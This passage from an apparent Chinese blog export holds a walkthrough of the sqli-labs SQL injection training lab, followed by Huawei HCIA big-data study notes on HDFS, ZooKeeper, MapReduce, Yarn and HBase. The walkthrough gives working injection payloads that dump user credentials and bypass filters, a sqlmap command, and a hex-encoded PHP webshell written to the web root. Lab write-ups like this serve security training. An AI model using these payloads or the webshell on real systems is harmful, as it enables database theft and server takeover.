#使用sqlmap绕过防火墙进行注入测试\n```","tags":["工具","sqlmap"],"categories":["工具使用"]},{"title":"SQL注入靶场sqli-labs","url":"/2022/04/24/SQL注入靶场sqli-labs/","content":"# sql注入\nSQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）\n\n## 常见的注入点\n- GET/POST/PUT/DELETE参数\n- X-Forwarded-For\n- 文件名\n- 4.1.2.2. Fuzz注入点\n- ' / \"\n- 1/1\n- 1/0\n- and 1=1\n- \" and \"1\"=\"1\n- and 1=2 \n- or 1=1\n- or 1=\n- ' and '1'='1\n- \\+ - ^ * % /\n- << >> || | & &&\n- ~\n- !\n- @\n- 反引号执行\n\n## 4.1.2.3. 测试用常量\n```bash\n@@version\n@@servername\n@@language\n@@spid\n@@database\n@@user\n@@version_compile_os\n```\n## 测试列数\n\n```bash\nhttps://www.xxx.com/index.asp?id=12+union+select+null,null--\n```\n\n## 报错注入\n```bash\n- select 1/0\n- select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a\n- extractvalue(1, concat(0x5c,(select user())))\n- updatexml(0x3a,concat(1,(select user())),1)\n- exp(~(SELECT * from(select user())a))\n- ST_LatFromGeoHash((select * from(select * from(select user())a)b))\n- GTID_SUBSET(version(), 1)\n```\n\n\n## 基于geometric的报错注入\n```bash\n- GeometryCollection((select * from (select * from(select user())a)b))\n- polygon((select * from(select * from(select user())a)b))\n- multipoint((select * from(select * from(select user())a)b))\n- multilinestring((select * from(select * from(select user())a)b))\n- LINESTRING((select * from(select * from(select user())a)b))\n- multipolygon((select * from(select * from(select user())a)b))\n其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 commit 95825f 。\n而以上列表中基于geometric的报错注入在这个 commit 5caea4 中被修复，在5.5.x较后的版本中同样不再生效。\n\n```\n\n## 堆叠注入\n- ;select 1\n\n## 注释符\n- --+\n- /*xxx*/\n- /*!xxx*/\n- /*!50000xxx*/\n\n\n## 判断过滤规则\n- 是否有trunc\n- 是否过滤某个字符\n- 是否过滤关键字\n- slash和编码\n\n## 获取信息\n- 判断数据库类型\n    - and exists (select * from msysobjects ) > 0 access数据库\n    - and exists (select * from sysobjects ) > 0 SQLServer数据库\n- 判断数据库表\n    - and exsits (select * from admin)\n- 版本、主机名、用户名、库名\n- 表和字段\n    - 确定字段数\n        - Order By \n        - Select Into\n    - 表名、列名\n    \n## 测试权限\n- 文件操作\n- 读敏感文件\n- 写shell \n- 带外通道\n- 网络请求\n\n[原文](https://websec.readthedocs.io/zh/latest/vuln/sql/fuzz.html)\n\n# sqli-labs\n\n## less-1\n    基于错误的字符串/数字注入\n\n判断注入点为数字注入\n```\n?id= -1\n```\n\n依次猜解字段数为3\n```bash\n?id= 1' order by  3 --+\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151345546.png?token=ARYCSAQAJQKU4EFI7DF2DP3CQCJ2A)\n\n\n联合构造回显位,-1是让前面为假\n```bash\n?id= -1' union select 1,2,3 --+ \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151351875.png?token=ARYCSATQIWNB74JBLB7W6H3CQCKTO)\n\n通过回显位查询用户名和数据库名\n```bash\n?id=-1' union select 1,user(),database() --+ \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151350693.png?token=ARYCSAS2JY6N73XIVIQGAULCQCKP4)\n\n查询所有库名\n```bash\n?id=-1' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+\n\ngroup_concat 分组\nschema_name 存储所有库信息的一个字段\ninformation_schema 存储所有库信息的一个库\ninformation_schema.schemata 存储所有库名的一个表 \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151352288.png?token=ARYCSASN6T4ZWRHELOIJ4DTCQCKV2)\n\n\n查询security数据库的所有表名\n```bash\n?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security') ,3 --+ \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151352713.png?token=ARYCSARJLSPH7D5CDHU7C7TCQCKXE)\n\n查询users表的所有列\n```bash\n?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name = 'users') ,3 --+ \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151353521.png?token=ARYCSAWGBVK5Z2MZAZKQ2UTCQCKY6)\n\n查询用户名和密码\n```bash\n?id=-1' union select 1,(select group_concat(username) from security.users) ,(select group_concat(password) from security.users) --+ \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151353047.png?token=ARYCSAV4ZAU7YIEL2K2WS2LCQCK2G)\n## less-2\n\n同 less1,是数值型注入不需要闭合\n```bash\n?id=-1 union select 1,(select group_concat(username) from security.users) ,(select group_concat(password) from security.users) \n```\n\n## less-3\n源码\n```php\n$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n```\n\n需要构造闭合 `')`\n```bash\n?id=-1') UNION SELECT 1,(select group_concat(username) from security.users ),database() --+\n```\n\n## less-4\n源码\n```php\n$id = '\"' . $id . '\"';\n$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";\n$result=mysql_query($sql);\n```\n\n由 `\"`引起的注入,构造闭合 `\")`\n\n```bash\n?id=-1\") UNION SELECT 1,(select group_concat(username) from security.users ),database() --+\n```\n\n## less-5\n源码 \n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n\tif($row)\n\t{\n  \techo '<font size=\"5\" color=\"#FFFF00\">';\t\n  \techo 'You are in...........';\n  \techo \"<br>\";\n    \techo \"</font>\";\n  \t}\n```\n\n由 `'` 引起注入,但是无回显\n\n- updatexml \n    - MySQL 5.1.5版本以上才支持该函数\n    - 返回的数据限制为32位,可以用substring函数进行数据位移偏转\n    - 对XML文档进行修改\n    - UPDATEXML (XML_document, XPath_string, new_value);\n    - 第一个参数：XML_document是String格式，为XML文档对象的名称\n    - 第二个参数：XPath_string (Xpath格式的字符串)\n    - 第三个参数：new_value，String格式，替换查找到的符合条件的数据\n    - 作用：改变文档中符合条件的节点的值\n- 写法\n```bash\n  select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n```\n\n- 实例\n```bash\n?id=1'  and (updatexml(1,concat(0x7e,(select substring(group_concat(password),1)from users),0x7e),1))--+\n```\n\n## less-6\n源码\n```php\n$id = '\"'.$id.'\"';\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n$result=mysql_query($sql);\n```\n\n此处使用 `\"` 闭合,正确返回Use outfile,错误返回You have an error in your SQL syntax\n\n\n## less-7\n源码\n```php\n$sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n\n\tif($row)\n\t{\n  \techo '<font color= \"#FFFF00\">';\t\n  \techo 'You are in.... Use outfile......';\n  \techo \"<br>\";\n  \techo \"</font>\";\n  \t}\n\telse \n\t{\n\techo '<font color= \"#FFFF00\">';\n\techo 'You have an error in your SQL syntax';\n\t//print_r(mysql_error());\n\techo \"</font>\";  \n\t}\n```\n\n依旧没有回显,闭合符号换成 `'))`,使用`into outfile`写入shell\n\n```bash\n?id=-1')) union select 1,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e,3 into outfile \"/var/www/html/Less-7/shell.php\"--+\n```\n\n## less-8\n源码\n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n        if($row)\n        {\n        echo 'You are in...........';\n        }\n        else\n        {\n\n        echo '<font size=\"5\" color=\"#FFFF00\">';\n        //echo 'You are in...........';\n        //print_r(mysql_error());\n        //echo \"You have an error in your SQL syntax\";\n        echo \"</br></font>\";\n        echo '<font color= \"#0000ff\" font size= 3>';\n\n        }\n```\n\n基于布尔的盲注,由 `'` 引起的注入,正确回显You are in...,错误无回显\n\n- 判断数据库长度\n\n```bash\n  ?id=1' and (length(database())) = 8 --+ #数库名长度=8\n```\n\n- 逐一猜解库名\n\n```bash\n?id=1' and (ascii(substr((select database()) ,1,1))) = 115--+\n判断库名的第一个字符是否等于ascii码的115也就是s,等于返回正确页面,不等于返回错误页面\n```\n```bash\n逐一猜解...\n?id=1' and (ascii(substr((select database()) ,2,1))) = 101 --+\n```\n\n- 判断表长度\n```bash\n?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 5 --+\n```\n\n- 猜解表名\n```bash\n?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,1,1))) = 117 --+\n逐一猜解...\n```\n\n## less-9\n源码\n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n\n\tif($row)\n\t{\n  \techo 'You are in...........';\n  \t}\n\telse \n\t{\n\techo 'You are in...........';\n\t}\n```\n基于时间的盲注,由 `'` 引起的注入,但是正确和错误都回显一样\n\n- 判断注入\n```bash\n?id=1'+and+if(1=1, sleep(5), null)+ --+\n```\n\n- 判断库名长度\n```bash\n?id=1' + and (length(database())) =8 + and + if(1=1,sleep(5),null) + --+\n```\n\n- 逐一猜解表名\n```bash\n?id=1' + and (ascii(substr(database(),1,1))) = 115 + and + if(1=1,sleep(3),null) + --+\n```\n\n## less-10\n源码\n```php\n$id = '\"'.$id.'\"';\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n```\n\n和less-9一样只是闭合符号换成 `\"`\n\n## less-11\n源码\n```php\n\t@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\n\t$result=mysql_query($sql);\n\t$row = mysql_fetch_array($result);\n\tif($row)\n\t{\n\t\techo 'Your Login name:'. $row['username'];\n\t\techo 'Your Password:' .$row['password'];\n  \t}\n\telse  \n\t{\n\t\tprint_r(mysql_error());\n\t}\n```\nPOST注入由 `'` 引起,注入语句由post提交\n\n- 万能登录\n```bash\nuname=admin' or '1'='1' #&passwd=1\n```\n\n- 判断数列\n```bash\nuname=admin' order by 2 #&passwd=1\n```\n\n- 猜解库名\n```bash\nuname=-admin' union select 1,(select group_concat(schema_name) from information_schema.schemata)##&passwd=1 \n```\n- 后面依次猜解\n\n## less-12\n源码\n```php\n\t$uname='\"'.$uname.'\"';\n\t$passwd='\"'.$passwd.'\"'; \n\t@$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\";\n\t$result=mysql_query($sql);\n\t$row = mysql_fetch_array($result);\n```\n和less-11一样只是闭合符号换成 `\")`\n\n- 猜解库名\n```bash\nuname=-admin\") union select 1,(select group_concat(schema_name) from information_schema.schemata)##&passwd=1 \n```\n\n## less-13\n源码\n```php\n @$sql=\"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1\";\n        $result=mysql_query($sql);\n        $row = mysql_fetch_array($result);\n```\n由 `')` 引起的注入,错误有回显,正确无回显\n\n- payload \n```bash\nuname=1') and (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#&passwd=1\n```\n\n## less-14\n源码 \n\n```php\n$uname='\"'.$uname.'\"';\n\t$passwd='\"'.$passwd.'\"'; \n\t@$sql=\"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1\";\n\t$result=mysql_query($sql);\n\t$row = mysql_fetch_array($result);\n```\n与less-13一致,闭合符号换成`\"`\n\n-payload\n```bash\nuname=1\" and (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#&passwd=1\n```\n\n## less-15\n源码\n```php\n$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\n        $result=mysql_query($sql);\n        $row = mysql_fetch_array($result);\n```\n基于时间的POST盲注,无回显 由`'`引起\n\n- payload\n```bash\nuname=1' or if(length(database())= 8,sleep(3),null) #&passwd=1\n```\n\n- 依次猜解\n\n\n## less-16\n源码\n```php\n\t$uname='\"'.$uname.'\"';\n\t$passwd='\"'.$passwd.'\"'; \n\t@$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\";\n\t$result=mysql_query($sql);\n\t$row = mysql_fetch_array($result);\n```\n\n与less-15一致,闭合符号换成 `\")`\n\n## less-17\n源码\n```php\n@$sql=\"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n        if($row)\n        {\n                $row1 = $row['username'];\n                $update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\";\n                mysql_query($update);\n                }\n```\n\nupdate报错注入,对passwd参数注入\n- payload\n```bash\nuname=admin & passwd=123' or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) #\n```\n\n- sqlmap注入\n  ```bash\n  sqlmap -u \"http://127.0.0.1/sqlilabs2/Less-17/\" --data \"uname=admin&passwd=woshiadmin&submit=Submit\" -p passwd --dbms mysql --threads 10 --method POST --flush-session --fresh-queries --level 1 --risk 1 --technique E --dbs\n  ```\n    - data:指定请求信息\n    - p:指定参数\n    - dbms:指定后端数据库\n    - threads:指定并发线程数\n    - method:指定请求方式\n    - flush-session:清除session\n    - fresh-queries:发起新的请求\n    - level 1:尝试POST和GET注入\n    - risk 1:仅测试常见用例\n    - technique E:仅测试报错注入方式\n    \n\n## less-18\n源码\n```php\n\t$sql=\"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\";\n\t$result1 = mysql_query($sql);\n\t$row1 = mysql_fetch_array($result1);\n```\n\n抓包对ua进行注入\n- payload\n```bash\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0)' and (updatexml(1,concat(0x7e,user(),0x7e),1)) and '1' = '1\n```\n\n## less-19\n对Referer进行注入,参数一致\n\n## less-20\n对cookie进行注入,参数一致\n\n## less-21\n对cookie进行注入,需要用base64编码对注入cookie编码\n\n- payload\n```bash\nCookie: uname=YWRtaW4nIGFuZCAodXBkYXRleG1sKDEsY29uY2F0KDB4N2UsdXNlcigpLDB4N2UpLDEpKSBhbmQgJzEnID0gJzE=%3d\n```\n\n## less-22\n同上闭合为 `\"`\n\n## less-23\n注释符被过滤\n\n- payload\n```bash\n?id=-1' union select 1,(select group_concat(username,password ) from users),3  or  '1' = '1\n```\n\n## less-24\n二次注入\n在插入username的就直接把注入的payload插到数据库里，取出来时候造成注入\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151353507.png?token=ARYCSAQA54RALIR36KQEMBLCQCK3I)\n\n登录了admin' or 1=1#这个账号 输入新密码admin\nupdate的时候就把原先的admin' or 1=1 #取出来拿到语句中了,所以密码都是admin了。\n\n## less-25 \n绕过系列\n\n双写绕过\n- payload\n```bash\n?id=1' anandd 1=1 --+\n```\n```bash\n?id=-1' union select 1,database(),3 --+\n```\n\n## less-25a \n没有单引号闭合\n\n- payload\n```bash\n?id=1 anandd 1=1 --+\n```\n```bash\n?id=-1 union select 1,database() ,3--+\n```\n\n## less-26\n单引号闭合 过滤了 or，and ， /* , – , # , 空格 , /\n\n- payload\n```bash\n?id=1'%26%26extractvalue(null,concat(0x7e,(select(group_concat(username,'~',passwoorrd))from(security.users)),0x7e))oorr'\n```\n\n## less-26a\n加了个)闭合\n\n- payload\n```bash\n?id=1111')union%A0select(1),(select(group_concat(id,'~',username,'~',passwoorrd))from(security.users)),3%7c%7c('1\n```\n\n## less-27\n在上关的基础上过滤了union和select\n- payload\n```bash\n?id=1'%09and%09updatexml(1,concat(0x7e,(SeleCt(group_concat(username,password))from(users)),0x7e),1)and'1\n```","tags":["sql注入","靶场"],"categories":["靶场"]},{"title":"华为HCIA","url":"/2022/04/20/华为HCIA/","content":"# 大数据概述&解决办法\n\n## 大数据的特征（5v+1c）\n- 大量：数据量巨大，MB,GB,TB,PB\n- 多样：数据类型多样，数据来源多样 数据来源：服务器日志、网站浏览信息、社交\\\n结构化数据：表格数据 平台、摄像头信息\\\n半结构化数据：网页html、xml\\\n非结构化数据：视频、音频、图片、文字\n- 高速：数据产生速度快、数据处理速度快\n- 价值：价值密度低\n- 准确：数据真实性\n- 复杂：数据产生速度快、数据的类型多样等特征，导致做数据处理时处理过程变得很复杂\n\n## 大数据处理流程\n数据采集->数据预处理->数据存储->分析挖掘->数据可视化\n\n### 大数据任务类型\n- IO密集型任务：大量输入输出请求的任务IO资源\n- 计算密集型任务：有大量的计算要求，CPU资源\n- 数据密集型任务：数据处理，并发数据处理\n\n## 大数据的计算类型（数据处理类型）\n- 批处理：一次处理一批量数据，处理的数据量大，但是延迟性高\n- 流处理：一次处理一条数据，处理的数据量小，但是延迟性低\n- 图处理：以图的形式展示数据，进行处理\n- 查询分析计算：检索功能\n\n## 大数据解决方案\nFusioninsight HD:部署在x86架构上\nBigData pro:部署在ARM架构上\nMapReduce Server（MRS）:部署华为云服务上\n- 高性能：支持自我研发的存储系统CarbonData\n- 易运维：提供了可视化的管理界面\n- 高安全：使用Kerborse & Ldap实现认证管理和权限管理\n- 低成本：按需购买，自定义配置底层架构性能\n\n# HDFS分布式文件系统\n\n## HDFS (Hadoop分布式文件系统)\n- 创建人:道格卡廷\n- 起始原因:开发一个搜索引擎-->存储问题(大量数据的存储)\n- google论文: GFS - google自身的分布式文件系统 `闭源`\n\n## HDFS特性\n理论上HDFS存储可以无限扩展\n- 分布式:把多节点的存储系统结合为一一个整体对外提供服务(提高存储能力)\n- 容错性:针对每个数据存储备份(默认3份)，备份存储分别存在不同的位置，如果备份或者数据有丢失，会再进行备份，保持一直都是3份\n- 按块存储:块大小默认128M, 一个文件可以存储在多个块,`但是一个块只存储一个文件` \\\n  `好处:数据丢失针对丢失的数据所属的块，只恢复当前块就可以`\n- 元数据:记录文件存储在哪些块,块存储在哪里等信息 \\\n  每个块都有一个元数据信息，并且元数据的大小是固定的150K\n  \n\n## HDFS适用场景\n- 可以做大文件\n- 可以协助离线处理或批处理\n- 流式数据访问机制\n\n## HDFS不适合做什么\n- 不适合大量小文件存储\n- 不适合做实时场景\n- 不适合随机读写，可以做追加写\n\n## `HDFS为什么不适合大量小文件存储`\n    (例: 10个文件，每个文件大小为20M)\n1. 10个文件需要使用10个块，并且每个块只是用了20M空间---> 存储空间浪费\n2. 有10个元数据，元数据150K\n3. 寻址时间增长\n\n不适合随机读写，可以做追加写\n\n\n## HDFS系统架构\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151412876.png?token=ARYCSARTUOKY4IGIGBRS7KTCQCM62)\n\n- Client (客户端) :用户接口，用户通过Client连接到组件\n- NameNode (名称节点，主节点) :管理DataNode,并且接收用户请求,分发任务，存储元数据信息\n- DataNode (数据节点，从节点) :实际处理用户请求，维护自己的Block和实际存储位置映射关系\n- Block (块) : 数据存储\n\n\n## HDFS单NameNode的问题\n- 单名称节点故障:整个集群都无法使用--->HA(主备配置)\n- 单名称节点性能瓶颈问题:并发处理的任务量有限---->联邦机制\n\n## HDFS HA特性(主备配置)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151412014.png?token=ARYCSAW7AVKCAPDCYNNV5YLCQCM74)\n- active节点:对外提供服务\n- standby节点:不断备份active节点的数据，`当active宕机,standby会成为新的active`\n- zookeeper监测主节点的状态，一旦发现故障，zookeeper就通知备用节点成为新的主节点\n\n\n## HDFS的联邦机制\n    各个NN之间是相互隔离的，维护自己的命名空间\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151412309.png?token=ARYCSAUWS6RZPANWYMQDOCLCQCNAU)\n\n\n## HDFS元数据持久化(主备同步)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151412204.png?token=ARYCSAVN7VZ2UZ6V7RVJRITCQCNBS)\n\n1. 备节点会通知主节点新建一个Editlog.new文件， 从这之后的操作都记录在.new文件中\n2. 备节点从主节点拷贝Editlog、Fsimage文件(只有第一 次需要 下载Fsimage,后续同步使用本地的)\n3. 将两个文件进行合并，生成Fsimage.ckpt文件\n4. 备节点将Fsimage.ckpt上传到主节点上\n5. 主节点接收到Fsimage.ckpt恢复成Fsimage\n6. 把Editlog.new重命名Editlog\n\n\n## HDFS副本机制 (3份)\n- 存储副本规则: \n1. 第一份副本存放在同一节点中(传输最快,但是如果节点故障，副本也会丢失)\n2. 第二份副本存放在同一机架的不同节点上(如果整个机架故障，副本也会丢失)\n3. 第三分副本存放在不同机架的其他节点上\n- 副本距离公式:`优先选择的是距离小的`\n1. 同节点的距离为0\n2. 同一机架不同节点的距离为2\n3. 不同机架的节点距离为4\n\n## HDFS读取流程\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151413392.png?token=ARYCSAQS3MNXYXLIKXZRAT3CQCNFE)\n\n1. Client向NameNode发起读取请求\n2. NameNode接收到请求，反馈对应的元数据信息给Client\n3. Client接收到反馈请求对应的DataNode `(如果Client本地有数据，优先从本地读取)`\n4. DataNode接收到请求，反馈数据内容给Client\n5. 关闭读取流\n\n## HDFS写入流程\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151413093.png?token=ARYCSASXKVI2WMTKAJWTIR3CQCNF2)\n\n1. Client向NameNode发出写入请求\n2. NameNode接收到请求后生成该文件的元数据信息，反馈DataNode信息给Client\n3. Client接收到DataNode信息之后，请求相对应的DataNode\n4. Client提交文件写入到对应的DataNode\n5. DataNode接收到写入请求，执行写入\n6. Client写入第一-个节点后，由第一个节点写入第二个节点，第二个节点写入第三个节点\n7. 写入完成后反馈元数据信息给Client\n8. 关闭读取流，NameNode更新元数据信息\n\n# ZooKeeper\n    分布式服务应用，可以帮助其他分布式组件协调管理集群\n\n## ZooKeeper的特性\n- 分布式服务, ZooKeeper集群中有一半以上的节点存活集群才能正常运行\n- 最终一致性:所有的节点对外提供的是同一个视图\n- 实时性:实时获取、实时反馈应用状态\n- 可靠性: 一条数据被-个节点接收到，就会被其他节点也接收\n- 等待无关性:慢的或者失效的client请求，不会影响到其他客户端请求\n- 原子性:最终状态只有成功或者失败\n\n## ZooKeeper集群主从选举/主备切换\n- 选举: zookeeper内部投票选举,当节点得到一半以上的票数,它就会称为Leader,其他的节点都是Follower\n- 主备切换:当leader出现故障,从其他的follower中重新选举新的leader\n\n\n## ZooKeeper的容灾能力 \n    (可容灾集群最低要求是3个节点)\n- 在集群运行过程中允许发生故障的节点数(最大:节点数-半-1)\n- 如:集群只要1个节点，容灾能力为0\\\n    集群只要2个节点，容灾能力为0\\\n    集群只要3个节点，容灾能力为1\\\n    集群只要4个节点，容灾能力为1\n- 搭建集群时，尽量选择奇数台节点进行搭建\n\n## ZooKeeper的读特性\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151414245.png?token=ARYCSAUWFL3VQLC74QPFOFTCQCNHA)\n\n1. Client发起读取请求\n2. 获取到数据(不管接收请求的是Leader节点还是Follower节点)\n\n## ZooKeeper的写特性\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151414157.png?token=ARYCSAXYXQNR64JHII24XQDCQCNII)\n\n1. Client发起写入请求 如果请求到的节点不是leader节点，follower会把请求转发给leader\n2. leader接收到请求后会向所有节点发出询问是否可以接收写入\n3. 节点接收到询问请求,根据自身情况反馈是否可写入的信息给leader\n4. leader接收到一半以上的节点可以写入，再执行写入\n5. 写入完成后反馈给client,如果Client请求的不是leader, leader把写 入状态反馈给follower,由follower反馈给client\n\n\n# MapReduce\n    数据处理(数据计算)\n    创建者:道格卡廷\n    出发点:搜索引擎-->处理问题google: mapreduce论文MapReduce的特性:分布式计算\n\n## MapReduce的特性:分布式计算\n- 高度抽象的编程思想:编程人员只需要描述做什么，具体怎么做交由处理框架执行的\n- 可扩展性:分布式、搭建在集群上的一-个处理组件\n- 高容错性:处理任务时节点故障，迁移到其他节点执行任务MapReduce任务主要分为两大部分: map任务、 reduce任务\n\n## MapReduce任务\n- reduce任务的处理数据来源是map任务的输出\n- map阶段:针对每个数据执行一个操作, 提取数据特征\n- reduce阶段:获取到多个map的输出，统一计 算处理,针对key统计汇总这个key对应的value\n\n## Map阶段详情\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151414971.png?token=ARYCSATLAWLW5KMTUFKFGMLCQCNJA)\n\n1. 数据从数据源获取后进行分片切分、执行map操作\n2. 分片会被存储在环形内存缓冲区( 当缓冲区达到80%会发生溢写)\n3. 把分片溢写到磁盘中，生成MOF文件\n4. 溢写过程中对数据执行\n\n## Map阶段详情\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151414178.png?token=ARYCSAQANK6MV3W4IXLU2I3CQCNJY)\n\n1. 把数据(MOF)从磁盘中加载到内存中\n2. 当数据量过大会执行归并，如果不多，直接跳过归并执行归约操作\n3. 执行完reduce操作之后，最终结果写入到HDFS\n\n\n## 词频统计案例(单词计数WordCount)\n1. 数据源(很多英文句子或短语的一个文件)\n2. 提取出每个单词,统计单词出现的次数\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151415672.png?token=ARYCSAXFO4SAXDL2SDP6U2DCQCNMS)\n\n\n## MapReduce缺点\n- 处理延迟性高\n- 使用java语言编程map处理reduce处理\n- MapReduce处理任务需要使用资源\n\n## MapReduce V1资源调度出现的问题\n- 如果发生问题，通知用户介入解决\n- 没有区分任务调度和资源调度，都是MR的主节点在处理，主节点的整体工作压力非常大\n- 因为资源没有单独隔离,容易出现资源抢占的问题\n\n\n# Yarn\n    资源调度管理服务---> 可以协助其他组件应用协调管理资源，以及任务调度\n\n## Yarn的系统架构\n    在集群层面来说只有一个ResourceManager, 多个NodeManager\n    以程序执行层面来说，一个应用只有一-个AppMaster,多个Container\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151415737.png?token=ARYCSARBIQVH4N564AKKJMLCQCNNI)\n\n- Client:客户端\n- ResourceManager (主节点) :负责资源管理,任务调度\n- NodeManager (从节点) :负责提供资源，实际任务执行\n- ApplicationMaster:特殊的Container, 管理同一应用的其他Container,以及实时关注任务执行状态,反馈给RM\n- Container:`资源的抽象`，被封装起来的资源，一个Container执行一个任务, 其他任务不能使用这个Container的资源\n\n\n## `MapReduce On Yarn任务处理流程`\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151416739.png?token=ARYCSARS5WJ7BORNAHKFOJLCQCNN4)\n\n1. Client向RM发起请求\n2. RM(ApplicationManager)接收到请求后在NM中启动一-个AppMaster\n3. AppMaster接收任务，根据任务向RM (ResourceScheduler) 申请资源\n4. 在NM中封装资源Container提供给AppMaster执行应用\n5. 执行过程中Container会实时反馈执行状态给AppMaster\n6. AppMaster会反馈任务执行状态和自身状态给RM (ApplicationManager)\n7. AppMaster将运行结果反馈给RM,然后向RM (ResourceScheduler) 申请释放资源\n8. RM将任务情况反馈给Client\n\nYarn搭建时支持主备配置，实现主备ResourceManager\nAppMaster的容错(当-个AppMaster出现故障,任务管理会被迁移到新的AppMaster)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151416345.png?token=ARYCSAT3PEMWREPF6Y6UIPLCQCNO4)\n\n# HBase\n    HBase分布式列式NoSQL数据库，底层存储使用的是HDFS ,`没有数据类型，所有数据存储都是字节数组的形式byte[]`\n    创建者:道格卡廷\n    出发点:搜索引擎-->提高数据读写速度--> BigTable\n\n## HBase的特性\n- 可扩展性:可以通过添加节点的方式增加数据存储空间\n- 高可靠性:底层使用HDFS,能够保证数据的可靠性，预写式日志保证内存中的数据不丢失\n- 高性能:处理PB级别的数据\n- 面向列: HBase数据存储是面向列的\n- 可伸缩性:动态添加列(在添加数据的时候)- \n\n## 面向列、面向行数据库的优缺点\n- 面向行:\\\n    优点:能方便快捷的获取一一行记录\\\n    缺点:在想要单独获取指定列数据的时候，会检索到其他无关列\n- 面向列:\\\n    优点:在检索单列数据时，不会出现无关列\\\n    缺点:想要查询一条记录时，需要多次IO请求才能拼出一条记录\n  \n\n\n## HBase和RDB (关系型数据库)的区别比较\n- 数据索引: \\\n  HBase只有一 种索引(rowkey)，RDB中可以配置多个索引\n- 数据维护: \\\n  HBase允许数据增删查,`不支持修改`，RDB中允许数据增删查改\\\n  HBase可以使用覆盖的方式写入数据以此实现数据修改的功能\n可伸缩性: HBase可以在添加数据时动态添加列，RDB只能通过修改表的方式添加列\nRDB (MySQL) 数据模型:数据库、表、行、列(字段)，单元格\n\n\n## HBase数据模型\n    命名空间、表、行、列(组成列族)、单元格(可以存储多条记录)\n- 命名空间: hbase、 default. 自定义(在使用自定义的命名空间时都需要指定命名空间名称)\n- 表:由行和列组成\n- 行:有一个唯一表示行键(rowkey)\n- 列:归属于某一个列族(`动态添加`)\n- 列族:由一个或多个列组成(创建表时创建的，不能动态更改)\n- 单元格:由行和列能确定-一个单元格，`一个单元格中可能存在多条记录(多版本记录，使用时间戳进行区分)`\n\n## HBase的表结构\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151416733.png?token=ARYCSAXZAIA7GUOAB6GHIRDCQCNPY)\n\n    要找到行列对应的单元格值时，表行键,列族:列\n    默认情况下，只返回单元格中的最新记录，如果要返回多版本需要指定参数VERSIONS=>3\n\n## HBase系统架构\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151416644.png?token=ARYCSASVT7UT7XUFLMIYFLLCQCNRC)\n\n- Client:用户可以通过Client连接到HBase,基本不与HMaster交互\n- ZooKeeper:监测HMaster的主备运行状态及主备切换，监测HRegionServer的状态，反馈给HMaster,`存储HBase元数据信息hbase:meta`\n- Hmaster() 